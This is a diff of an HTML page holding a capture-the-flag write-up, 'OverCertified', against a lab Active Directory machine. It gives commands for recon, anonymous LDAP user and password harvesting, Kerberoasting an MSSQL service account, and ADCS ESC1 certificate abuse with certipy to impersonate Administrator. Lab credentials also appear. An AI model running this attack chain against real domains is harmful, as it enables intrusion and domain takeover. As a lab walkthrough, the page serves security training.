@@ -100,7 +100,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#ldap-enum" class="md-skip">
+        <a href="#network-recon" class="md-skip">
           Skip to content
         </a>
       
@@ -1394,18 +1394,27 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#ldap-enum" class="md-nav__link">
+  <a href="#network-recon" class="md-nav__link">
     <span class="md-ellipsis">
-      LDAP Enum
+      Network recon
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#movement-to-mssqlserver" class="md-nav__link">
+  <a href="#ldap-enumeration" class="md-nav__link">
     <span class="md-ellipsis">
-      Movement to MSSQLSERVER
+      LDAP Enumeration
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#lateral-movement-to-mssqlserver" class="md-nav__link">
+    <span class="md-ellipsis">
+      Lateral Movement to MSSQLSERVER
     </span>
   </a>
   
@@ -1421,9 +1430,9 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#nt-authority" class="md-nav__link">
+  <a href="#administrator" class="md-nav__link">
     <span class="md-ellipsis">
-      NT \AUTHORITY
+      Administrator
     </span>
   </a>
   
@@ -3815,18 +3824,27 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#ldap-enum" class="md-nav__link">
+  <a href="#network-recon" class="md-nav__link">
     <span class="md-ellipsis">
-      LDAP Enum
+      Network recon
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#movement-to-mssqlserver" class="md-nav__link">
+  <a href="#ldap-enumeration" class="md-nav__link">
     <span class="md-ellipsis">
-      Movement to MSSQLSERVER
+      LDAP Enumeration
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#lateral-movement-to-mssqlserver" class="md-nav__link">
+    <span class="md-ellipsis">
+      Lateral Movement to MSSQLSERVER
     </span>
   </a>
   
@@ -3842,9 +3860,9 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#nt-authority" class="md-nav__link">
+  <a href="#administrator" class="md-nav__link">
     <span class="md-ellipsis">
-      NT \AUTHORITY
+      Administrator
     </span>
   </a>
   
@@ -3872,15 +3890,15 @@
   <h1>OverCertified</h1>
 
 <hr />
-<p>Network recon
+<h2 id="network-recon">Network recon</h2>
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>sudo<span class="w"> </span>nmap<span class="w"> </span>-T4<span class="w"> </span>-A<span class="w"> </span>-v<span class="w"> </span>-o<span class="w"> </span>nmap<span class="w"> </span>--min-rate<span class="w"> </span><span class="m">1000</span><span class="w"> </span><span class="m">10</span>.129.229.25<span class="w"> </span>-Pn
-</span></code></pre></div></p>
+</span></code></pre></div>
 <p>Multi-protocol recon
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>enum4linux-ng<span class="w"> </span>-A<span class="w"> </span><span class="m">10</span>.129.229.25
 </span></code></pre></div>
-<img alt="" src="../../../assets/Pasted%20image%2020250619151611.png" />
-We have anonymous LDAP access</p>
-<h3 id="ldap-enum">LDAP Enum</h3>
+<img alt="" src="../../../assets/Pasted%20image%2020250619205012.png" /></p>
+<p>We have anonymous LDAP access</p>
+<h2 id="ldap-enumeration">LDAP Enumeration</h2>
 <p>Get users:
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-b<span class="w"> </span><span class="s2">&quot;DC=certified,DC=htb&quot;</span><span class="w"> </span>-s<span class="w"> </span>sub<span class="w"> </span><span class="s2">&quot;(&amp;(objectclass=user))&quot;</span><span class="w"> </span>-H<span class="w"> </span>ldap://10.129.229.25<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span>samaccountname:<span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-f<span class="w"> </span><span class="m">2</span><span class="w"> </span>-d<span class="w"> </span><span class="s2">&quot; &quot;</span><span class="w"> </span>&gt;<span class="w"> </span>users.txt
 </span></code></pre></div>
@@ -3894,7 +3912,7 @@ Getting users descriptions
 </span></code></pre></div>
 We get a password
 <img alt="" src="../../../assets/Pasted%20image%2020250619151934.png" /></p>
-<h3 id="movement-to-mssqlserver">Movement to MSSQLSERVER</h3>
+<h2 id="lateral-movement-to-mssqlserver">Lateral Movement to MSSQLSERVER</h2>
 <p>Lets check for users with SPNs set
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-b<span class="w"> </span><span class="s2">&quot;DC=certified,DC=htb&quot;</span><span class="w"> </span>-s<span class="w"> </span>sub<span class="w"> </span><span class="s2">&quot;(&amp;(objectClass=user)(servicePrincipalName=*))&quot;</span><span class="w"> </span>-H<span class="w"> </span>ldap://10.129.229.25<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span>samaccountname:<span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-f<span class="w"> </span><span class="m">2</span><span class="w"> </span>-d<span class="w"> </span><span class="s2">&quot; &quot;</span>
 </span></code></pre></div>
@@ -3909,7 +3927,7 @@ Try to crack the hash
 <img alt="" src="../../../assets/Pasted%20image%2020250619153349.png" />
 <div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>MSSQLSERVER:lucky7
 </span></code></pre></div></p>
-<h3 id="mssql-enumeration">MSSQL Enumeration</h3>
+<h2 id="mssql-enumeration">MSSQL Enumeration</h2>
 <p><div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>nxc mssql 10.129.229.25 -u &#39;MSSQLSERVER&#39; -p &#39;lucky7&#39; -q &#39;SELECT name FROM master.dbo.sysdatabases;&#39;
 </span></code></pre></div>
 <img alt="" src="../../../assets/Pasted%20image%2020250619154454.png" />
@@ -3941,7 +3959,7 @@ after grabbing the user flag and poking around, i decided to run bloodhound
 <img alt="" src="../../../assets/Pasted%20image%2020250619165504.png" />
 We see <code>thomas</code> has inherited access to the <code>CERTIFICATE SERVICE DCOM ACCESS</code> group. This makes me think the priv esc is an ADCS misconfiguration
 <img alt="" src="../../../assets/Pasted%20image%2020250619165619.png" /></p>
-<h3 id="nt-authority">NT \AUTHORITY</h3>
+<h2 id="administrator">Administrator</h2>
 <hr />
 <p>Use certipy to find vulnerable templates
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>certipy-ad<span class="w"> </span>find<span class="w"> </span>-vulnerable<span class="w"> </span>-u<span class="w"> </span>thomas<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;159357&#39;</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.129.229.25
@@ -3950,8 +3968,8 @@ We see <code>thomas</code> has inherited access to the <code>CERTIFICATE SERVICE
 We see this template is vulnerable to ESC1
 <img alt="" src="../../../assets/Pasted%20image%2020250619171221.png" />
 Lets collect what we need for ESC1: Template name, CA, target domain.
-<img alt="" src="../../../assets/Pasted%20image%2020250619171545.png" />
-cant build our pfx request targeting the administrator user
+<img alt="" src="../../../assets/Pasted%20image%2020250619171545.png" /></p>
+<p>we can build our pfx request targeting the administrator user
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>certipy-ad<span class="w"> </span>req<span class="w"> </span>-u<span class="w"> </span>thomas<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;159357&#39;</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.129.229.25<span class="w"> </span>-template<span class="w"> </span>Auth<span class="w"> </span>-upn<span class="w"> </span>Administrator@certified.htb<span class="w"> </span>-ca<span class="w"> </span>CERTIFIED-CA<span class="w"> </span>-target<span class="w"> </span>certified.certified.htb
 </span></code></pre></div>
 <img alt="" src="../../../assets/Pasted%20image%2020250619171857.png" />
